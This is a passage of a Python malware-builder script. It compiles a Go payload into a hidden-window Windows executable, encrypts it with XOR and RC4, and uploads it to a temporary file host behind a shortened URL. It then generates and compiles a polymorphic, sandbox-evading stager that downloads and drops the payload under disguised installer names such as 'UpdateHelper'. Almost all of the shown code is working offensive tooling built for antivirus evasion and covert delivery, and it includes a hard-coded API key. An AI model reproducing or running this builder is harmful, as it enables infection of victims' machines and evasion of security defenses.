                    resp = requests.post(self.API_URL, data=data, files=files, timeout=120)
                    resp.raise_for_status()
                    result = resp.text.strip()
                    if result.startswith("http"):
                        return result
                    raise Exception(f"Invalid response: {result}")
            except Exception:
                if attempt < self.retries - 1:
                    time.sleep(self.delay)
                else:
                    raise
        raise Exception("Upload failed")


class URLShortener:
    @staticmethod
    def shorten(url):
        api = "https://edgqrfijgnyboeymkydu.supabase.co/functions/v1/shorten"
        headers = {
            "Content-Type": "application/json",
            "x-api-key": "listentosmokeforever",
        }
        try:
            resp = requests.post(api, json={"url": url}, headers=headers, timeout=15)
            resp.raise_for_status()
            return resp.json().get("raw_url", url)
        except Exception:
            return url


# ============================================================
# LOGGING
# ============================================================

def log(msg, level="INFO"):
    prefix = {"INFO": "[*]", "OK": "[+]", "ERR": "[-]", "WARN": "[!]"}[level]
    print(f"{prefix} {msg}")


# ============================================================
# STAGE 1 — Compile payload → XOR + RC4 encrypt → upload
# ============================================================

def stage_compile_payload(raw_payload, xor_key, rc4_key, litterbox):
    with tempfile.TemporaryDirectory() as tmpdir:
        src_path = os.path.join(tmpdir, "main.go")
        with open(src_path, "w", encoding="utf-8") as f:
            f.write(raw_payload)

        # Copy exe_main.go (provides func main for EXE builds)
        exe_main_src = os.path.join(os.path.dirname(os.path.abspath(__file__)), "exe_main.go")
        if os.path.exists(exe_main_src):
            shutil.copy2(exe_main_src, os.path.join(tmpdir, "exe_main.go"))

        out_path = os.path.join(tmpdir, "payload.exe")
        env = os.environ.copy()
        env["GOOS"] = "windows"
        env["GOARCH"] = "amd64"
        env["CGO_ENABLED"] = "0"
        env["GOTOOLCHAIN"] = "local"

        log("Initializing Go module...")
        subprocess.run(["go", "mod", "init", "payload"], cwd=tmpdir, capture_output=True, env=env)
        subprocess.run(["go", "get", "golang.org/x/sys@v0.29.0"], cwd=tmpdir, capture_output=True, env=env)
        subprocess.run(["go", "mod", "tidy"], cwd=tmpdir, capture_output=True, env=env)

        log("Compiling (GOOS=windows, stripped, windowsgui)...")
        build = subprocess.run(
            ["go", "build", "-ldflags", "-s -w -H windowsgui", "-o", out_path, "."],
            cwd=tmpdir, capture_output=True, text=True, env=env,
        )
        if build.returncode != 0:
            raise Exception(f"Go build failed:\n{build.stderr}")

        with open(out_path, "rb") as f:
            bin_data = f.read()
        log(f"Compiled binary: {len(bin_data)} bytes", "OK")

        # Layer 1: XOR
        bin_data = xor_bytes(bin_data, xor_key)
        log("Layer 1: XOR encrypted", "OK")

        # Layer 2: RC4
        bin_data = rc4_crypt(bin_data, rc4_key)
        log("Layer 2: RC4 encrypted", "OK")

        enc_path = os.path.join(tmpdir, "payload.bin")
        with open(enc_path, "wb") as f:
            f.write(bin_data)

        url = litterbox.upload(enc_path)
        log("Payload uploaded to staging", "OK")
        return url


# ============================================================
# STAGE 3 — Generate polymorphic VM-based stager
# ============================================================

def stage_generate_stager(payload_url, xor_key, rc4_key, sandbox=True):
    drop_name = random.choice(DROP_NAMES) + ".exe"
    drop_subdir = random.choice(DROP_SUBDIRS)
    sleep_ms = random.randint(2000, 5000)

    # Build drop path (relative, forward slashes)
    drop_path = "/".join(list(drop_subdir) + [drop_name])

    # Assemble VM bytecode
    asm = VMAssembler()
    bytecode = asm.assemble(
        url=payload_url,
        xor_key=xor_key,
        rc4_key=rc4_key,
        drop_path=drop_path,
        sleep_ms=sleep_ms,
    )
    log(f"Bytecode assembled: {len(bytecode)} bytes, {len(asm.used_opcodes())} opcodes", "OK")

    # Generate Go source
    source = generate_stager_source(asm, bytecode, sandbox=sandbox)
    log(f"Polymorphic stager source generated ({len(source)} chars)", "OK")

    tmpdir = tempfile.mkdtemp()
    src_path = os.path.join(tmpdir, "main.go")
    with open(src_path, "w", encoding="utf-8") as f:
        f.write(source)

    subprocess.run(["go", "mod", "init", "stager"], cwd=tmpdir, capture_output=True)

    log(f"Drop target: {'/'.join(drop_subdir)}/{drop_name}", "OK")
    if sandbox:
        log("Anti-analysis: CPU check, timing check (no flagged APIs)", "OK")
    log(f"VM opcodes randomized, {random.randint(4,6)} fake handlers injected", "OK")
    return tmpdir



# ============================================================
# STAGE 4 — Compile stager
# ============================================================

def stage_compile_stager(stager_dir, output_name):
    if not output_name.endswith(".exe"):
        output_name += ".exe"

    out_path = os.path.join(os.getcwd(), output_name)
    env = os.environ.copy()
    env["GOOS"] = "windows"
    env["GOARCH"] = "amd64"
    env["CGO_ENABLED"] = "0"

    # -w strips debug info but keeps symbol table (less suspicious than -s -w)
    log("Compiling stager (windowsgui)...")
    cmd = ["go", "build", "-ldflags", "-w -H windowsgui", "-o", out_path, "."]
    build = subprocess.run(cmd, cwd=stager_dir, capture_output=True, text=True, env=env)

    if build.returncode != 0:
        raise Exception(f"Stager build failed:\n{build.stderr}")

    if os.path.exists(out_path):
        size = os.path.getsize(out_path)
        log(f"SUCCESS: {output_name} ({size:,} bytes)", "OK")
    else:
        log("Stager binary not found after build", "ERR")

    try:
        shutil.rmtree(stager_dir, ignore_errors=True)
    except Exception:
        pass


# ============================================================
# ============================================================
# MAIN
# ============================================================

def main():
    go_file = os.path.join(os.getcwd(), "main.go")
    if not os.path.exists(go_file):
        log("main.go not found in current directory.", "ERR")
        sys.exit(1)

    with open(go_file, "r", encoding="utf-8") as f:
        raw_payload = f.read()
    log(f"Loaded payload: main.go ({len(raw_payload)} chars)", "OK")

    # --- Standard EXE stager pipeline ---
    name_prefixes = ["SetupHost", "Installer", "PkgSetup", "RuntimeSetup", "UpdateHelper"]
    output_name = f"{random.choice(name_prefixes)}_{random.randint(100, 999)}.exe"
    xor_key = generate_key(32)
    rc4_key = generate_key(32)
    litterbox = LitterboxAPI(retention="24h")

    log(f"Output: {output_name}")
    log(f"XOR Key: {xor_key}")
    log(f"RC4 Key: {rc4_key}")
    print()

    try:
        # STAGE 1: Compile, dual-layer encrypt, upload
        log("--- Stage 1: Compile & Encrypt Payload ---")
        payload_url = stage_compile_payload(raw_payload, xor_key, rc4_key, litterbox)

        # STAGE 2: Shorten URL
        log("\n--- Stage 2: Shorten Payload URL ---")
        short_url = URLShortener.shorten(payload_url)
        log("Shortened URL ready", "OK")

        # STAGE 3: Generate polymorphic VM stager
        log("\n--- Stage 3: Generate VM Stager ---")
        stager_dir = stage_generate_stager(payload_url, xor_key, rc4_key)

        # STAGE 4: Compile stager
        log("\n--- Stage 4: Compile Stager ---")
        stage_compile_stager(stager_dir, output_name)

        print()
        log("=== Pipeline Complete ===", "OK")
    except Exception as e:
        log(f"Stopped: {e}", "ERR")
        sys.exit(1)


if __name__ == "__main__":
    main()
